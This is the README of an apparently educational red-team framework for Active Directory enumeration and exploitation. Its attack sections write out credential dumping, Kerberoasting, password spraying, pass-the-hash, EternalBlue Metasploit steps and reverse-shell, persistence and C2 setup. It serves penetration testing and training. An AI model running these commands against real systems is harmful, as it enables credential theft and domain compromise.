# EnumPath
## Advanced Windows Domain Exploitation Framework By 1x0DF0
### RED TEAM EDITION

![Version](https://img.shields.io/badge/version-3.0-red)
![Python](https://img.shields.io/badge/python-3.x-blue)
![Platform](https://img.shields.io/badge/platform-Kali_Linux-green)
![License](https://img.shields.io/badge/license-Educational-yellow)

---


---

## 📋 Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Output Structure](#output-structure)
- [Attack Modules](#attack-modules)
- [Examples](#examples)
- [Troubleshooting](#troubleshooting)

---

## 🎯 Overview

EnumPath Pro is a comprehensive Windows domain enumeration and exploitation framework designed for cybersecurity professionals and students in controlled lab environments. It automates the discovery of vulnerabilities, credential harvesting, and attack path generation in Windows Active Directory environments.

### Key Capabilities:
- 🔍 **Automated Enumeration** - SMB, LDAP, RPC, Kerberos
- 🔓 **Credential Harvesting** - Hash dumping, Kerberoasting, AS-REP Roasting
- 💥 **Vulnerability Detection** - MS17-010, ZeroLogon, PrintNightmare, and more
- 🎯 **Attack Path Generation** - Automated exploitation scripts
- 📊 **BloodHound Integration** - AD relationship mapping
- 🚀 **C2 Framework Support** - Cobalt Strike, Empire configs
- 📝 **Comprehensive Reporting** - JSON outputs, attack commands

---

## ✨ Features

### Enumeration Modules
- **SMB Enumeration**: Version detection, share enumeration, signing checks
- **User/Group Discovery**: Domain users, groups, computer accounts
- **LDAP Queries**: Extended LDAP enumeration, LAPS detection
- **Kerberos Attacks**: Kerberoasting, AS-REP Roasting, ticket manipulation
- **Password Policy**: Lockout thresholds, complexity requirements
- **Service Discovery**: WinRM, RDP, MSSQL, LDAP

### Exploitation Capabilities
- **Hash Dumping**: SAM/SYSTEM/SECURITY extraction
- **Pass-the-Hash**: PTH command generation
- **Password Spraying**: Automated spray with lockout prevention
- **Persistence Mechanisms**: Registry, scheduled tasks, services
- **Lateral Movement**: PSExec, WMI, DCOM, RDP
- **Privilege Escalation**: Service abuse, token impersonation

### Reporting & Output
- **Attack Paths**: Step-by-step exploitation guides
- **Credential Storage**: Organized hash files
- **Command Generation**: Ready-to-use exploitation commands
- **BloodHound Data**: AD relationship graphs
- **JSON Reports**: Machine-readable findings

---

## 🔧 Installation

### Prerequisites
- **Operating System**: Kali Linux 2024.x (Recommended) or Debian-based Linux
- **Python Version**: Python 3.8+
- **Network Access**: Ability to reach target Windows systems on ports 445, 139, 135, 389

### Quick Install (Kali Linux)

```bash
# 1. Clone or download the tool
git clone https://github.com/yourusername/enumpath-pro.git
cd enumpath-pro

# 2. Install core dependencies
sudo apt update
sudo apt install -y \
    python3-impacket \
    crackmapexec \
    smbmap \
    enum4linux \
    smbclient \
    ldap-utils \
    nmap \
    evil-winrm \
    responder \
    bloodhound \
    neo4j

# 3. Install Python colorama
sudo apt install python3-colorama -y

# 4. Make script executable
chmod +x enumpath_pro.py

# 5. Verify installation
python3 enumpath_pro.py -h
```

### Manual Installation Script

```bash
#!/bin/bash
# Save as: install_enumpath.sh

echo "[*] Installing EnumPath Pro dependencies..."

# Core tools
sudo apt update
sudo apt install -y \
    python3-impacket \
    crackmapexec \
    smbmap \
    enum4linux \
    smbclient \
    rpcclient \
    ldap-utils \
    nmap \
    evil-winrm \
    nbtscan \
    python3-colorama

# Optional but recommended
sudo apt install -y \
    hashcat \
    john \
    metasploit-framework \
    bloodhound \
    neo4j

echo "[+] Installation complete!"

# Test critical tools
for tool in crackmapexec smbmap enum4linux rpcclient impacket-secretsdump; do
    if which $tool > /dev/null 2>&1; then
        echo "✓ $tool installed"
    else
        echo "✗ $tool missing"
    fi
done
```

---

## 🚀 Usage

### Basic Syntax
```bash
python3 enumpath_pro.py -t <TARGET_IP> [OPTIONS]
```

### Common Options
| Option | Description | Example |
|--------|-------------|---------|
| `-t, --target` | Target IP address (required) | `10.10.10.100` |
| `-u, --username` | Username for authentication | `administrator` |
| `-p, --password` | Password for authentication | `Password123` |
| `-d, --domain` | Domain name | `CORP.LOCAL` |
| `--aggressive` | Enable exploitation modules | - |
| `--lhost` | Local IP for reverse shells | `10.10.14.1` |
| `--lport` | Local port for reverse shells | `4444` |
| `--threads` | Number of threads (default: 8) | `16` |
| `-v, --verbose` | Verbose output | - |
| `-o, --output` | Custom output directory | `results` |

### Usage Examples

#### 1. Basic Null Session Enumeration
```bash
python3 enumpath_pro.py -t 10.10.10.100
```

#### 2. Authenticated Enumeration
```bash
python3 enumpath_pro.py -t 10.10.10.100 -u john -p Password123
```

#### 3. Domain User with Full Enumeration
```bash
python3 enumpath_pro.py -t 10.10.10.100 -d CORP.LOCAL -u john -p Password123 -v
```

#### 4. Aggressive Mode with Exploitation
```bash
python3 enumpath_pro.py -t 10.10.10.100 -u administrator -p Admin123 \
    --aggressive --lhost 10.10.14.1 --lport 4444
```

#### 5. Full Red Team Engagement
```bash
python3 enumpath_pro.py -t 10.10.10.100 -d CORP.LOCAL -u admin -p Password1 \
    --aggressive --lhost 10.10.14.1 --threads 16 -v -o full_assessment
```

---

## 📁 Output Structure

After running EnumPath Pro, the following directory structure is created:

```
enumpath_<TARGET>_<TIMESTAMP>/
├── credentials/           # Password lists and spray scripts
│   ├── passwords.txt     # Common passwords for spraying
│   ├── spray.sh         # Automated spray script
│   └── users.txt        # Discovered usernames
├── exploits/            # Exploitation scripts and payloads
│   ├── reverse_shells_*.txt
│   └── persistence.txt
├── kerberos/           # Kerberos-related attacks
│   ├── kerberoast.txt  # Kerberoastable hashes
│   ├── asreproast.txt  # AS-REP roastable hashes
│   └── ticket_commands.txt
├── lateral_movement/   # Lateral movement techniques
│   ├── movement_commands.txt
│   └── mimikatz.txt
├── privesc/           # Privilege escalation vectors
│   ├── windows_privesc.txt
│   └── powerup.ps1
├── c2_configs/        # C2 framework configurations
│   ├── profile.profile  # Cobalt Strike profile
│   └── empire.yaml     # Empire configuration
├── bloodhound/        # BloodHound collection data
│   └── *.zip
├── exploitation/      # Auto-exploitation scripts
│   └── exploit.rc     # Metasploit resource script
├── hashes.txt        # Dumped NTLM hashes
├── pth_commands.txt  # Pass-the-Hash commands
└── report.json       # Complete JSON report
```

---

## ⚔️ Attack Modules

### 1. Credential Harvesting
```bash
# Automated hash dumping
impacket-secretsdump DOMAIN/user:pass@10.10.10.100

# Kerberoasting
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip 10.10.10.100 -request

# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.100
```

### 2. Password Spraying
```bash
# Generated spray script usage
cd enumpath_*/credentials/
./spray.sh

# Manual spray with CrackMapExec
crackmapexec smb 10.10.10.100 -u users.txt -p passwords.txt --continue-on-success
```

### 3. Pass-the-Hash
```bash
# Using dumped hashes
evil-winrm -i 10.10.10.100 -u administrator -H <NTLM_HASH>
impacket-psexec administrator@10.10.10.100 -hashes <LM:NTLM>
```

### 4. Exploitation
```bash
# Use generated Metasploit script
msfconsole -r enumpath_*/exploitation/exploit.rc

# Manual exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.100
set LHOST 10.10.14.1
exploit
```

### 5. BloodHound Analysis
```bash
# Start Neo4j database
sudo neo4j console

# Start BloodHound GUI
bloodhound

# Import collected data
Upload enumpath_*/bloodhound/*.zip files
```

---

## 💡 Advanced Usage

### Custom Password Lists
```python
# Edit the generate_password_list() method to add custom passwords
passwords = [
    'CompanyName2024!',
    'SeasonYear!',
    # Add your custom passwords here
]
```

### Targeting Multiple Hosts
```bash
# Create a wrapper script
for ip in $(cat targets.txt); do
    python3 enumpath_pro.py -t $ip -u admin -p Password123
done
```

### Integration with Other Tools
```bash
# Use with Proxychains
proxychains python3 enumpath_pro.py -t 192.168.1.100 -u admin -p pass

# Use with Metasploit
msf6 > resource enumpath_*/exploitation/exploit.rc

# Import to Cobalt Strike
cobalt-strike> profiles load enumpath_*/c2_configs/profile.profile
```

---

## 🔍 Troubleshooting

### Common Issues and Solutions

#### 1. "rpcclient: command not found"
```bash
# rpcclient is part of smbclient package
sudo apt install smbclient -y
which rpcclient  # Should show /usr/bin/rpcclient
```

#### 2. Python colorama error
```bash
# Install via apt instead of pip
sudo apt install python3-colorama -y
```

#### 3. "Connection refused" errors
```bash
# Check if target is reachable
ping <target_ip>
nmap -p445 <target_ip>

# Check firewall rules
sudo iptables -L
```

#### 4. Timeout errors
```bash
# Increase timeout in script or use verbose mode
python3 enumpath_pro.py -t <target> -v

# For slow networks, modify timeout in code:
# Change: timeout=30 to timeout=60
```

#### 5. BloodHound collection fails
```bash
# Ensure bloodhound-python is installed
pipx install bloodhound

# Or use apt
sudo apt install bloodhound -y
```

---

## 📊 Sample Output

```
╔══════════════════════════════════════════════════════════════════╗
║                     EnumPath Pro v3.0                           ║
║          Advanced Windows Domain Exploitation Framework         ║
║                    RED TEAM LAB EDITION                         ║
╚══════════════════════════════════════════════════════════════════╝

[*] Target: 10.10.10.100
[*] Credentials: administrator:********
[*] Output: enumpath_10.10.10.100_20240815_185023

[PHASE 1: ENUMERATION]
[*] Aggressive SMB Enumeration
[+] Domain: CORP.LOCAL
[+] OS: Windows Server 2019

[PHASE 2: CREDENTIAL HARVESTING]
[+] Hash: Administrator:aad3b435b51404eeaad3b435b51404ee
[+] Kerberoasted 5 accounts - hashes saved

[PHASE 3: EXPLOITATION PREPARATION]
[+] Reverse shells generated
[+] Persistence mechanisms created
[+] C2 configs generated

[PHASE 4: ANALYSIS & REPORTING]
[+] BloodHound data collected
[+] Full report saved to enumpath_10.10.10.100_20240815_185023/report.json
[+] ENUMERATION COMPLETE - READY FOR EXPLOITATION
```

---

## 🛡️ Legal & Ethical Use

### Authorized Testing Only
- ✅ Use on YOUR OWN systems
- ✅ Use in authorized penetration tests with WRITTEN permission
- ✅ Use in isolated lab environments (HTB, THM, personal labs)
- ❌ NEVER use on systems you don't own or lack permission to test
- ❌ NEVER use for malicious purposes

### Educational Purpose
This tool is designed for:
- Cybersecurity education and training
- Authorized penetration testing
- Security research in controlled environments
- CTF competitions and challenges

---

## 🤝 Contributing

Contributions are welcome! Please ensure any additions:
- Follow ethical guidelines
- Include proper documentation
- Are tested in lab environments
- Don't include malicious capabilities

---

## 📝 License

This tool is provided for EDUCATIONAL PURPOSES ONLY. The authors assume no liability for misuse or damage caused by this program. Use responsibly and ethically.

---

## 🔗 Resources

### Learning Resources
- [HackTheBox](https://www.hackthebox.eu) - Practice labs
- [TryHackMe](https://tryhackme.com) - Guided learning paths
- [OSCP Guide](https://www.offensive-security.com/pwk-oscp/) - Certification prep

### Tool Documentation
- [Impacket](https://github.com/SecureAuthCorp/impacket) - Network protocol toolkit
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Network enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - AD analysis

---

## 📧 Support

For educational questions and lab setup help:
- Create an issue on GitHub
- Join cybersecurity Discord communities
- Check documentation for the underlying tools

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally!**
